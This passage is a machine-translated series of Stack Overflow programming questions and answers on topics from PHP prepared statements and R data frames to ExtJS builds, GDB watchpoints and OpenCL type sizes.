较新版本的soapUI 中内置了许多此类功能。我相信从soapUI 4.0开始就内置了。看看[soapui网站上的文档](http://soapui.org/Security/security-scans-overview.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-03T06:10:46.787

您可以使用 SoapUi 4.6.4 Pro 版本。它提供了高覆盖率的安全测试。

**例如：**边界扫描、跨站点脚本、自定义脚本、模糊扫描、无效类型、SQL 注入、XPATH 注入。

请查看以下链接以了解使用 soapUi 进行安全测试 [http://www.soapui.org/security-testing/working-with-security-tests.html](http://www.soapui.org/security-testing/working-with-security-tests.html)

# php - 关于 SQL 的两件事我不太了解

> ID：12427798
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:33.263
> 
> 标签：php, sql

我在 PHP 文件中有这个查询：

```
return $this->_getDb()->fetchRow('
SELECT *
FROM xf_user
WHERE user_id = ?
', $userId); 
```

最后一行是做什么的，在谷歌上快速查找后我发现问号是一个动态参数。谁能给我一个更详细的解释？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:44:14.590

~~好吧，您缺少命令的一部分（注意不平衡的引号）。我怀疑你在一开始就遗漏了一两行。~~ （用户编辑帖子以包含缺失的行）。

参数所做的是获取参数的值（保存在 $userID 变量中的值）并使用它来评估 SQL 查询。因此，如果 $userID 包含值 101，则执行的查询基本上是`SELECT * FROM xf_user WHERE user_id = 101`.

但是，使用参数不同于简单地将查询构造为文本语句，因为参数经过类型检查并且可以安全抵御 SQL 注入攻击。此外，使用 $userID 中的新值多次执行的同一命令将执行得更快，因为 SQL 引擎可以只“准备”一次语句，而不是每次执行它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:46:49.237

看起来您正在使用准备好的语句。允许您“准备”一个期望动态参数在 MySQL 服务器上传递给它的查询。然后，您在单独的操作中发送必要的参数。

这可以提供一些性能优势，但也可以在防止 SQL 注入攻击方面提供巨大的安全优势。

尽管您似乎没有使用 MySQLI，但您可以阅读 PHP mysqli::prepare 文档以获取更多背景信息：

[http://php.net/manual/en/mysqli.prepare.php](http://php.net/manual/en/mysqli.prepare.php)

# jquery - jQuery UI Sortable 使用咖啡脚本添加双击功能

> ID：12427799
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:38.413
> 
> 标签：jquery, jquery-ui, coffeescript, jquery-ui-sortable, double-click

我有两个拖放列表，如下所示。我还希望能够添加在列表之间切换项目的双击事件。以下是我的可排序代码。

```
$('.product_shipments').sortable
  connectWith: '.available_product_shipments'
  appendTo: 'body'
  helper: 'clone'
  dropOnEmpty: true

$('.available_product_shipments').sortable
  connectWith: '.product_shipments'
  appendTo: 'body'
  helper: 'clone'
  dropOnEmpty: true 
```

不知道从哪里开始添加双击功能。这就是我到目前为止所拥有的。以下代码会触发事件，但不会移动列表项。到另一个 ul 元素。可能会搞砸的一件事是 .available_product_li 是 .available_product_shipments 的子列表。任何线索？

```
$(".available_product_li").delegate "li", "dblclick", ->
  $(".available_product_li li.clicked").removeClass("clicked").appendTo "body"
$("#product_shipments").delegate "li", "dblclick", ->
  $("#product_shipments li.clicked").removeClass("clicked").appendTo ".available_product_li" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T02:12:51.450

就这么简单。

```
$(".available_product_shipments").on "dblclick", ".product", ->
  $(this).appendTo ".product_shipments"
$(".product_shipments").on "dblclick", ".product", ->
  $(this).appendTo ".available_product_shipments" 
```

# r - 将函数应用于R中的不同data.frames

> ID：12427800
> 
> 赞同：3
> 
> 时间：2012-09-14T15:41:40.190
> 
> 标签：r, dataframe

我是新手R，我想问以下问题。

我有一组包含 2 列的 data.frame，我想将一个函数应用于 eac data.frame，而无需每次都输入 data.frame 的名称，即：

data.frames 将是：a, b, c, d, ......... 并且每个 data.frame 有 2 列具有不同的行长：

```
 a[1:4]
V1         V2
1   877.0578   609.0308
2   989.5682   160.1206
3  1049.5844   143.2906
4  1111.5798   214.5290 
```

我想将以下函数应用于每个 data.frame，这是我想应用的函数

```
 as.MassPeaks <- function(x) {return(createMassPeaks(mass=mass(x), intensity=intensity(x),metaData=metaData(x)))} 
```

我有一个包含所有 data.frame 名称的向量（名称）我尝试了以下代码，但它没有用

```
 for(i in length(names)){
    assign(i, createMassPeaks(mass=i[, 1], intensity=i[, 2]))
    } 
```

但是，当我尝试使用单个 data.frame 时，它​​可以工作

```
 p <- createMassPeask(mass=a[,1], intensity=[, 2]) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:15:12.130

您`for`失败是因为您忘记使用`get`功能

```
library(MALDIquant)  # You should write what package is used

`Names <- c('a', 'b','c')` # this a vector of names

for(i in Names){
  assign(i, createMassPeaks(mass=get(i)[, 1], intensity=get(i)[, 2]))
} 
```

这个循环应该可以工作。让我们测试一下

```
set.seed(001)
a <- data.frame(V1=rnorm(50, 1000, 50), V2=rnorm(50, 1000, 50))
b <- data.frame(V1=rnorm(50, 1000, 50), V2=rnorm(50, 1000, 50))
c <- data.frame(V1=rnorm(50, 1000, 50), V2=rnorm(50, 1000, 50)) 
```

结果如下所示：

```
> a
S4 class type            : MassPeaks           
Number of m/z values     : 50                  
Range of m/z values      : 889.265 - 1079.764  
Range of intensity values: 9.098e+02 - 1.12e+03
> b
S4 class type            : MassPeaks            
Number of m/z values     : 50                   
Range of m/z values      : 904.282 - 1104.358   
Range of intensity values: 9.256e+02 - 1.115e+03
> c
S4 class type            : MassPeaks            
Number of m/z values     : 50                   
Range of m/z values      : 855.554 - 1124.883   
Range of intensity values: 8.798e+02 - 1.132e+03 
```

尽管这个`for`循环运行良好，@David Robinson 的回答是最好的。我还想说一件事，我觉得你的函数应该是这样的：

```
as.MassPeaks <- function(x) {
  return(createMassPeaks(mass=x[, 1], 
                         intensity=x[, 2],
                         metaData=x))} 
```

`mass=x[, 1]`有效但`mass=mass(x[, 1])`无效，对于`instensity`and 也是如此`metaData`。然后使用大卫罗宾逊的方法，你应该得到：

```
lapply(list(a,b,c), as.MassPeaks)
[[1]]
S4 class type            : MassPeaks           
Number of m/z values     : 50                  
Range of m/z values      : 889.265 - 1079.764  
Range of intensity values: 9.098e+02 - 1.12e+03

[[2]]
S4 class type            : MassPeaks            
Number of m/z values     : 50                   
Range of m/z values      : 904.282 - 1104.358   
Range of intensity values: 9.256e+02 - 1.115e+03

[[3]]
S4 class type            : MassPeaks            
Number of m/z values     : 50                   
Range of m/z values      : 855.554 - 1124.883   
Range of intensity values: 8.798e+02 - 1.132e+03 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:48:28.400

您想将数据框放入列表中，然后用于`lapply`创建列表：

```
data.frames = list(a, b, c, d)
mass.peaks.each = lapply(data.frames, as.MassPeaks) 
```

现在`mass.peaks.each`是每个结果的列表。

顺便说一句，我认为您想更改`as.MassPeaks`为：

```
 as.MassPeaks <- function(x) {return(createMassPeaks(mass=mass(x[, 1]), intensity=intensity(x[, 2]),metaData=metaData(x)))} 
```

# php - 将参数发送到ios中的php脚本

> ID：12427804
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:53.540
> 
> 标签：php, objective-c, ios

我有一个 php 脚本，我想向它发送参数。在android中，我成功地使用了该代码：

你能帮我用 Obj-C 中的等效代码吗？

```
 nameValuePairs.add(new BasicNameValuePair("table", table));
         nameValuePairs.add(new BasicNameValuePair("code", Integer.toString(code)));
         nameValuePairs.add(new BasicNameValuePair("name", temp_name));
         nameValuePairs.add(new BasicNameValuePair("email", email)); 
```

我知道如何从 php 获取数据或调用 http 脚本，我只是不知道如何将这些参数发送到 php。

在php方面我的代码是这样的：

```
$table.=$_POST['table'];
$code.=$_POST['code'];
$name.=$_POST['name'];
$email.=$_POST['email']; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:59:41.860

证据在布丁中：[iOS：如何执行 HTTP POST 请求？](https://stackoverflow.com/questions/5537297/ios-how-to-perform-a-http-post-request)

不过，我建议您使用一个`NSDictionary`对象来保存您的值和 JSON 编码。获取 JSON 数据并将其提交到服务器。在您的 PHP 脚本中使用 JSON 解码来解码和处理结果。

# java - 控制台输出捕获的可用解决方案 - java

> ID：12427809
> 
> 赞同：1
> 
> 时间：2012-09-14T15:42:19.797
> 
> 标签：java, console

我正在制作一个能够直接在其中运行 java 编译器和 jvm 的程序（不要问我为什么要重新发明轮子，如果您的回复没有帮助，请保存它，我已经很沮丧花费几个小时的解决方案不起作用！）。到目前为止，我已经设法跟踪每当我在我的 textField 中输入以 java 开头的内容时，它实际上会包装文本并像这样运行它：

```
 if(String.valueOf(object).startsWith("java")){
        try{
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(String.valueOf(object));
        }
        catch(Exception e){gsc.mainWindow.printf("error");} 
```

考虑`gsc.mainWindow.printf(...);`我对 JFrame 中的 JTextArea 的输出。

我现在管理的是运行命令，但是任何失败我都可以将它直接打印到我的输出中。我知道这已经被回答过很多次了，阅读了大约 10 种方法来做到这一点，但它们都没有奏效或无法理解到我可以运行它的程度。我需要代码足够简单，因为这必须输出进程将在默认系统的控制台（cmd，终端）中写入的内容，然后停止（我认为这可能是一个方法调用）。我对这种东西很不满意，即使是多线程解决方案也能满足我的需求，真的没什么太专业的，我只需要它就能工作。您需要的任何信息，请询问！提前致谢！:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T15:54:33.300

我不知道您是否想阅读本文，但您知道，在 Java 世界中，您应该始终在实现自己的解决方案之前寻找解决方案。而常见问题的解决方案，大多数时候，来自[Apache Commons](http://commons.apache.org/)或其他 Apache 项目。说除了你的解决方案之外的所有东西都不起作用或对你来说太复杂只会花费你的时间和金钱（最终还有你的工作）。

[Apache Commons Exec](http://commons.apache.org/exec/)是您更快、更轻松地解决问题所需的工具。

- - 编辑 - -

这是一些如何捕获子进程输出的代码。有一个专门针对它的类[PumpStreamHandler](http://commons.apache.org/exec/apidocs/org/apache/commons/exec/PumpStreamHandler.html)：

```
DefaultExecutor exec = new DefaultExecutor();
PumpStreamHandler streamHandler = new PumpStreamHandler();
exec.setStreamHandler(streamHandler);

CommandLine commandline = CommandLine.parse(command);  //where command is your command line
exec.execute(commandline); 
```

---- 编辑 2 ----

这是您要使用以下命令捕获消息的复制粘贴解决方案`OutputStream`：

```
public abstract class LogOutputStream extends OutputStream {

protected static final String LINE_SEPERATOR = System.getProperty("line.separator");
public static final int DEFAULT_BUFFER_LENGTH = 2048;

protected boolean hasBeenClosed = false;
protected byte[] buf;
protected int count;
private int bufLength;

public LogOutputStream() {
    bufLength = DEFAULT_BUFFER_LENGTH;
    buf = new byte[DEFAULT_BUFFER_LENGTH];
    count = 0;
}

public void close() {
    flush();
    hasBeenClosed = true;
}

public void write(final int b) throws IOException {
    if (hasBeenClosed) {
        throw new IOException("The stream has been closed.");
    }
    if (b == 0) {
        return;
    }
    if (count == bufLength) {
        final int newBufLength = bufLength + DEFAULT_BUFFER_LENGTH;
        final byte[] newBuf = new byte[newBufLength];

        System.arraycopy(buf, 0, newBuf, 0, bufLength);

        buf = newBuf;
        bufLength = newBufLength;
    }
    buf[count] = (byte) b;
    count++;
}

public void flush() {
    if (count == 0) {
        return;
    }
    if (count == LINE_SEPERATOR.length()) {
        if (((char) buf[0]) == LINE_SEPERATOR.charAt(0)
                && ((count == 1) ||
                ((count == 2) && ((char) buf[1]) == LINE_SEPERATOR.charAt(1)))) {
            reset();
            return;
        }
    }
    final byte[] theBytes = new byte[count];
    System.arraycopy(buf, 0, theBytes, 0, count);
    log(new String(theBytes));
    reset();
}

private void reset() {
    count = 0;
}

public abstract void log(String message);
} 
```

然后只需创建它的一个子类，`public void log(String message)`用更新 UI 的代码来实现它，就完成了。

# php - foreach 和多维数组

> ID：12427810
> 
> 赞同：1
> 
> 时间：2012-09-14T15:42:20.560
> 
> 标签：php

我有一个多维数组，我想在应用函数后为每个数组创建新变量。我真的不知道如何将 foreach 与这种数组一起使用。到目前为止，这是我的代码：

```
$main_array = array
(
    [first_array] => array
        (
            ['first_array1'] => product1
            ['first_arrayN'] => productN
        )

    [nth_array] => Array
        (
            [nth_array1] => date1
            [nth_arrayN] => dateN
        )
)

function getresult($something){
        ## some code
        };

foreach ($main_array as ["{$X_array}"]["{$key}"] => $value) {
    $result["{$X_array}"]["{$key}"] = getresult($value);
    echo $result["{$X_array}"]["{$key}"];
    }; 
```

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:45:27.110

```
foreach ($main_array as &$inner_array) {
    foreach ($inner_array as &$value) {
        $value = getresult($value);
        echo $value;
    }
}

unset($inner_array, $value); 
```

Note the `&`, which makes the variable a reference and makes modifications reflect in the original array.

Note: The `unset` is recommended, since the references to the last values will stay around after the loops and may cause unexpected behavior if you're reusing the variables.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:49:07.760

```
foreach($main_array AS $key=>$array){
    foreach($array AS $newKey=>$val){
        $array[$newKey] = getResult($val);
    }
   $main_array[$key] = $array;
} 
```

# extjs - apps.jsb3 不包括控制器定义 - 构建时

> ID：12427814
> 
> 赞同：1
> 
> 时间：2012-09-14T15:42:44.100
> 
> 标签：extjs, extjs4, extjs4.1

我使用了命令`sencha create jsb -a http://myserver/myapp/app.html -p apps.jsb3 -v`

这创建了文件apps.jsb3，当我打开这个文件时，它包含了模型和商店的所有定义（但是，没有控制器）。

然后我跟着命令;

`sencha build -p apps.jsb3 -v -d .`这创建了 2 个文件。app.all.js 是模型、商店和 app.js 的压缩形式（它还包括在 app.js 中找到的应用程序控制器的定义）

例如：`....controllers:["Person","Pers...`同样

然后`all-classes.js`拥有所有模型和商店（同样没有控制器）

然后我将以下内容包含到我的 app.html 文件中

```
<script type="text/javascript" src="extjs/ext.js"></script>
<script type="text/javascript" src="app-all.js"></script> 
```

最后，我将 app-all.js、all-classes.js、app.html 复制到服务器的另一个文件夹中。这个文件夹叫做`SERVERFOLDER2`.

现在，当我键入时`http://myserver/SERVERFOLDER2/app.html`，它会说`"NetworkError: 404 Not Found - http://myserver/SERVERFOLDER2/app/controller/Person.js?_dc=1347636548640"`。

为什么会这样，我该如何解决？

**更新 APP.JS**

```
Ext.Loader.setConfig({
    enabled: true     
});
Ext.require('Ext.container.Viewport' );  
Ext.application({        
    requires: [                     
        'MyApp.Names',          
        'Ext.window.MessageBox'   
    ],                         
       models: [      
        'PersonModel',      
        'SchoolModel'                 
    ],     
    stores: [ 
        'PersonStore',
        'SchoolStore'  ,
        'GenderStore
    ],     
    views: [            
        'UserPanel',      
        'SchoolViewPanel',               
        'UpdateSchoolWindow' 
    ],            
    controllers: [        
        'SchoolController',    
        'PersonController',      
        'UserActionController',
    ],     
     name: 'MyApp', 
    refs: 
        [{         
            ref: 'viewport',   
            selector: 'viewport'
        }],     
    launch: function() {
        Ext.create('Ext.container.Viewport', {  
        layout: 'card',  
            items: [  
            { 
                xtype: 'panel',        
                items: {
                xtype: 'UserPanel' 
                }
            }
            ]
        });  

    },

    userSuccess: function() {  
        var st = Ext.getStore('PersonStore');         
        st.on('load', this.onSuccess, this, {    
            single: true,  
            delay: 100            
        }); 
        st.load();      
    },            

    onSuccess: function() {      
        this.getViewport().getLayout().setActiveItem(1); 
    }

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T04:41:26.387

你描述的过程对我来说看起来不错。

您应该关注的问题是为什么生成的 jsb3 文件不包含控制器类。接下来的所有步骤似乎都可以正常工作，但最终应用程序没有启动，因为打包过程不包含您的控制器类文件。

Ext.Loader 启动并尝试动态（“按需”）加载控制器类文件 - 这里的目标**不是**修复 Ext.Loader 找到控制器类的路径配置，而是确保控制器类是首先包含在`jsb3`步骤 1 中的文件中。

我假设您的应用程序`http://myserver/myapp/app.html`在非打包状态下启动它时启动良好（只有`ext-dev.js`和 no`ext-all.js`或其他`app.all.js`）。

我进一步假设您可以在控制台上观察到消息，这些消息大致如下：

> 同步加载“app.controller.Person”。考虑在 Ext.onReady 上方添加 Ext.require()

这意味着您的类依赖项配置不正确。控制器类**不会**作为依赖项被拾取，因此**不会**在您的应用程序启动之前预加载。

打包过程（您的第一步）依赖于依赖项来生成`jsb3`文件。它**不会**根据需要获取同步加载的依赖项。

**解决方案** 目标是在您启动应用程序时删除**任何**同步的按需加载。如果你成功了，打包过程也应该被修复。

作为一种快速解决方法，您可以简单地`Ext.require`将控制器类放在您的`Ext.onReady`or`Ext.application`调用之上。

但是，控制器类**应该**由框架自动添加为依赖项。如果不是，那么要么你的配置有问题，要么就是 ExtJs 中的一个错误。

# c++ - 尝试查看数组时调试会话冻结

> ID：12427815
> 
> 赞同：2
> 
> 时间：2012-09-14T15:42:44.543
> 
> 标签：c++, ide, gdb, anjuta, codelite

我正在使用 ubuntu 12.04。到目前为止，我已经使用 anjuta 和 codelite 作为 C++ 学校项目的 IDE。但是，我遇到了一个问题：启动调试器后，一切正常，直到我尝试在手表部分添加一个数组。它不显示任何内容，当我尝试继续调试时它会冻结，我必须停止调试会话。我不得不提一下，观察变量效果很好。

谢谢，

LE：实际上，调试功能只有在大数组的情况下才会冻结……那可能是codelite的一个错误。有什么意见吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:54:14.363

> 我不得不提一下，观察变量效果很好。

当您在变量上设置观察点时，GDB 可能会说`Hardware watchpoint N`（但您的 IDE 可能隐藏了该消息）。

当您在 x86 处理器上设置大于 8 字节的观察点时，GDB 无法设置硬件观察点（因为 x86 硬件不支持此类观察点）。GDB 设置了一个软件观察点。软件观察点实现如下：

1.  单步程序
2.  价值观改变了吗？否 -> 转到步骤 1。是：停止。

软件观察点*真的很*慢。如果您使用 观察您的系统`top`，您可能会发现 GDB 正在消耗 100% 的 CPU。

如果您*真的*需要观看整个数组，[这个答案](https://stackoverflow.com/a/12321112/50617)显示了如何使用 valgrind 来完成。

# web - 以下 lisp 程序无法按预期工作

> ID：12427818
> 
> 赞同：0
> 
> 时间：2012-09-14T15:42:51.510
> 
> 标签：web, lisp

以下是我的 lisp 代码，用于编译一个简单的 Web 服务器。

```
; 一些辅助函数
(require :asdf)
(defun loadlib (mod)
  (asdf:oos 'asdf:load-op mod))

(defun reload ()
  (load "web.lisp"))

; load 需要的库  
(loadlib :html-template)
(loadlib :hunchentoot)

; 设置 hunchentoot 编码
(defvar *utf-8* (flex:make-external-format :utf-8 :eol-style :lf))
(setq hunchentoot:*hunchentoot-default-external-format* *utf-8*)
; 设置url handler 转发表
(push (hunchentoot:create-prefix-dispatcher "/hello" 'hello) hunchentoot:*dispatch-table*)

; 页面控制器函数
(defun hello ()
  (setf (hunchentoot:content-type*) "text/html; charset=utf-8")
  (with-output-to-string (stream)
    (html-template:fill-and-print-template
     #P"/home/chonglinsun/Learn/cl/lib/web/index.tmpl"
     (list :name "Lisp程序员")
     :stream stream)))
; 启动服务器
(defun start-web (&optional (port 4444))
  (hunchentoot:start (make-instance 'hunchentoot:acceptor :port port)))

(defun restart-web ()
  (progn
    (reload)
    (start-web))) 
```

index.tmpl 的内容如下：

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Test Lisp Web</title>
  </head>
  <body>
    <h1>Lisp web开发实例&lt;/h1>
    hi, <!-- TMPL_VAR name -->
  </body>
</html> 
```

当我启动网络时，我无法访问 localhost:4444/hello，但我无法确定问题出在哪里。我在网上搜了一下，有人说是我的因为路径。但我认为我的代码中没有与之相关的东西。希望有人过来告诉我为什么。我用的是 ubuntu 12.10。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T21:15:22.180

您需要使用 an`easy-acceptor`而不是 an`acceptor`来使用该`*dispatch-table*`机制。

# ruby-on-rails - 未定义祖先字符串

> ID：12427821
> 
> 赞同：0
> 
> 时间：2012-09-14T15:43:09.940
> 
> 标签：ruby-on-rails, ruby

本质上，我有一个可以添加评论的类别，该类别显示任务列表。当您添加评论时，您可以回复所述评论，当您这样做并悬停回复链接时，您会看到类似于：

```
http://localhost:3000/categories/2/category_comments/new?parent=6 
```

然后我们获取该 ID，将其传递给回复论坛，然后将其分配给数据库中的祖先字符串以“嵌套”回复。问题是，父 ID 没有被传递给表单。表单的隐藏字段为空白。为什么？我们可以在下面的代码中走这个 id 应该采取的路径。

**类别控制器**

```
 def show 
    @category = Category.find(params[:id])
    @category_comment = @category.category_comments.build
  end 
```

这会在类别页面上显示评论，并将您回复的评论的 parent_id 传递给表单。

当我们点击回复时，我们会触发如下所示的`category_comments#new`和方法。`#create`

**category_comments_controller**

```
 def new
     @category = Category.find(params[:category_id])
     @category_comment = @category.category_comments.build(:parent_id => params[:parent_id])
  end

  def create
    @category = Category.find(params[:category_id])
    @category_comment = @category.category_comments.create(params[:category_comment].merge(:user_id => current_user.id))
    if @category_comment.save
      redirect_to project_category_path(@category.project, @category), :flash => {:success => 'Created comment'}
    else
      redirect_to :back, :flash => {:error => 'Could not create comment'}
    end
  end 
```

**更新：**

这不再是表单问题，而是控制器问题，处理将 parent_id 传递给表单。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:45:37.577

你`has_ancestry`在你的模型中定义了吗？我认为没有它会有一个有效的解释，这不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:46:18.830

试试这个：

```
<%= link_to 'Reply', new_category_category_comment_path(@category.id, :parent_id => category_comment.id)%> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:55:31.317

这有点神奇地固定了它的自我。我不知道发生了什么或发生了什么，但它现在神奇地起作用了>。>

# java - ics 文件的日期格式

> ID：12427825
> 
> 赞同：1
> 
> 时间：2012-09-14T15:43:46.287
> 
> 标签：java, datetime, outlook, icalendar

我从其他文章中看到 ics 文件的日期格式为

```
DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd'T'HHmmss"); 
```

但是，我不明白我从 Outlook ics 文件中得到了什么

```
DTSTART:16011104T020000 
```

1601 年从何而来？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:45:25.447

> “1601 年 (MDCI) 是从公历星期一开始的普通年，也是从慢 10 天的儒略历星期四开始的普通年。
> 
> 今年 1 月 1 日 (1601-01-01) 被 Microsoft Windows 用作文件日期和 Active Directory 登录日期的基准。
> 
> 这也是计算 ANSI 日期并被美国国家标准协会采用用于 COBOL 和其他计算机语言的日期”[1]

1.  [http://en.wikipedia.org/wiki/1601](http://en.wikipedia.org/wiki/1601)

# c++ - opencl 程序没有给出正确的输出

> ID：12427828
> 
> 赞同：1
> 
> 时间：2012-09-14T15:43:50.920
> 
> 标签：c++, opencl

以下 C++ 和 OpenCL 给出的“结果”为 3 而不是预期的 9 (3+6)，我不知道为什么。我的意图只是通过使用数组索引并在两个不同的数组索引处添加数字来测试访问以给出“结果”。鉴于我是 C、C++ 和 OpenCL 的新手，这很可能是基本的东西。另外，我使用向量作为输入是有原因的——这是我需要在更大范围内做的事情的试运行。非常感谢。

C++：

```
 vector<long> v1;
    vector<long> v2;
    long result;

    v1.push_back(3);
    v1.push_back(4);

    v2.push_back(5);
    v2.push_back(6);

    long* a1 = &v1[0];
    long* a2 = &v2[0];

    cl::Buffer bufA(context, CL_MEM_READ_ONLY | CL_MEM_USE_HOST_PTR, v1.size()*sizeof(long), a1);
    cl::Buffer bufB(context, CL_MEM_READ_ONLY | CL_MEM_USE_HOST_PTR, v2.size()*sizeof(long), a2);
    cl::Buffer bufC(context, CL_MEM_READ_WRITE, sizeof(long));

    addKernel.setArg(0, bufA);
    addKernel.setArg(1, bufB);
    addKernel.setArg(2, bufC);

    cl::CommandQueue queue(context, devices[0]);

    queue.enqueueTask(addKernel);

    queue.enqueueReadBuffer(bufC, CL_TRUE, 0, sizeof(long), &result);
    queue.flush();
    queue.finish();

    cout << "Result: " << result << endl; 
```

开放式CL：

```
__kernel void useHostPtr(__global long *a, __global long *b, __global long *c) {
    *c = a[0] + b[1];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:16:20.487

主机端的`long`类型可能有不同的长度。它通常是 4 个字节。在 OpenCL 中，`long`被定义为 64 位整数。您应该在主机代码中使用`cl_long`而不是。`long`

# jquery - 如何使用fadeTo 淡出而不是淡入？jQuery.fadeTo 反向

> ID：12427842
> 
> 赞同：0
> 
> 时间：2012-09-14T15:44:46.220
> 
> 标签：jquery, html, opacity

我想使用 jQuery.fadeTo 将不透明度从 1 更改为 0.7

```
jQuery("#my-element").fadeTo(2000, .7); 
```

此代码的结果以不透明度 0 开始我的元素，并在 2 秒后*淡入0.7。*

我想让我的元素从不透明度 1 开始并*淡出*到 0.7

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:49:30.397

[fadeTo](http://api.jquery.com/fadeTo/)将持续时间作为第一个参数，将不透明度作为第二个参数。请交换这些。并确保在开始 fadeTo 调用之前，不透明度为 1：

```
jQuery("#my-element").css({opacity: 1});
jQuery("#my-element").fadeTo(2000, 0.7); 
```

[更新：工作演示](http://jsfiddle.net/kXwJB/)

# ruby-on-rails - 是否有“Rails 方式”将 Twitter Bootstrap 主题折叠到 Rails 3 应用程序中？

> ID：12427844
> 
> 赞同：6
> 
> 时间：2012-09-14T15:44:48.623
> 
> 标签：ruby-on-rails, twitter-bootstrap, ruby-on-rails-3.2, asset-pipeline

我在线购买了一个漂亮的 Twitter Bootstrap 它们，它将为我的 Rails 3.2.8 应用程序增添趣味。该软件包包含以下目录：

```
/css
/img
/js 
```

当然，这些文件中会有相互关联的链接。是否有将此类东西集成到资产管道中的标准方法，或者将其公开仍然是一种标准做法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-02T18:58:48.870

您将需要使用资产管道。一切都在朝着那个方向发展，而且实际上并没有变得更难（除非是这样）。您的文件将进入`/app/assets/`目录。

对于 css，您应该可以将其直接放入`app/assets/stylesheets/`中，只要确保首先包含引导程序即可。有几个 gem 可以很容易地包含引导程序的文件。我使用[bootstrap-sass](https://github.com/thomas-mcdonald/bootstrap-sass)，但您也可以尝试[twitter-bootstrap-rails](https://github.com/seyhunak/twitter-bootstrap-rails)（取决于您是否需要 sass 支持）。对于任何一个，请查看我链接到的自述文件，因为它们包含一些您想了解的关于每个 gem 的有用细节。

对于 javascript，它应该是同样的事情。在您的 application.js 文件中，确保**之前** `//= require_tree .`包含引导程序，以防主题添加任何自定义 javascript。我之前列出的两个 gem 还包括 bootstrap 的 javascript 文件。您可以阅读他们的文档以查看详细信息（这两种宝石几乎与正常情况完全相同）。

就图像而言，将它们放在`app/assets/images/`目录中，您必须稍微更改样式表才能使其正常工作。当在样式表中声明图像时，例如`background: url('./images/bg.jpg');`，您需要使用`image_path`帮助器，所以它看起来像`background: url(image_path('bg.jpg'));`. 请注意，我只包含了图像的名称。资产管道会自动为您解析到正确的路径。

如果主题包含任何自定义字体，您将执行与图像相同的操作，除了`asset_path`在 @font-face 声明中使用这样的帮助器：

```
url(asset-path('museo700.ttf', font)); 
```

您还可以使用特定于类型的帮助器，例如`font-path`,`image-path`等。`asset-path`声明类型或特定于类型的帮助器都可以使用，只需与您使用的帮助器保持一致，以免产生混淆。

您可以将自定义字体放在类似`app/assets/fonts/`. 资产管道会自动找到它们，因为它们位于资产目录中。

# javascript - 如何使用Javascript在页面退出时执行功能并跟踪出站链接？

> ID：12427847
> 
> 赞同：0
> 
> 时间：2012-09-14T15:45:03.863
> 
> 标签：javascript, tracking, outbound

我想在页面退出之前执行一些功能，例如记录页面退出时间。

使用时的`onbeforeunload`事件显示我不想要的弹出窗口。

不知何故，当点击出站链接时，它应该进入一个函数，获取链接`href`，执行然后退出页面。

不使用`JQuery`.

这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:54:31.520

```
links = document.getElementsByTagName('a')
for(var i=0; i<links.length; i++){
    links[i].addEventListener('click', function(event){
        //do your stuff
        return true;
    });
}; 
```

试一试。

如果您需要有关链接本身的信息，请使用该`this`构造。具体来说：

```
this.href 
```

会给你链接地址。

[http://jsfiddle.net/6PEmj/5/](http://jsfiddle.net/6PEmj/5/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:15:08.900

`onbeforeunload`仅在指定返回值时发出警报。

尝试使用它来检测何时单击出站链接：

```
var a = document.getElementsByTagName('a'),
    i = a.length,
    domain = new RegExp(location.href.match(/(^.*)\./)[1]),
    onLeave = function () {
        if (!domain.test(this.href)) {
            alert('Leaving!');
        }
    };

while (i--) {
    a[i].onclick = onLeave;
} 
```

# .net - XAML element which can move in the whole grid and does not belong to a grid row or column

> ID：12427848
> 
> 赞同：0
> 
> 时间：2012-09-14T15:45:04.930
> 
> 标签：.net, wpf, xaml

As I am new with XAML and WPF my question might be ambigious. Accept my appologies in advance.

To make it simple, I am working on a project in which I have some buttons and a custom pointer to select one of these buttons. I could get the program working without using grid rows and columns to organize my elements. However when I was maximizing the window it was a mess. So, I used grid rows and columns with persentage width and height and solved this problem. But now, the pointer gets stucked in one of the grids and does not move outside. I want to define my pointer somehow that it can move along the whole grid without getting binded to a row or column. Here is my XAML code:

```
<Window x:Class="testGallery.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:local ="clr-namespace:Kinect.Toolbox;assembly=Kinect.Toolbox"
    Loaded="Window_Loaded"
    Title="MainWindow">

<Grid Margin="0,0,0,97">
    <Grid.RowDefinitions>
        <RowDefinition Height="68*" />
        <RowDefinition Height="101*" />
    </Grid.RowDefinitions>

    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="150*" />
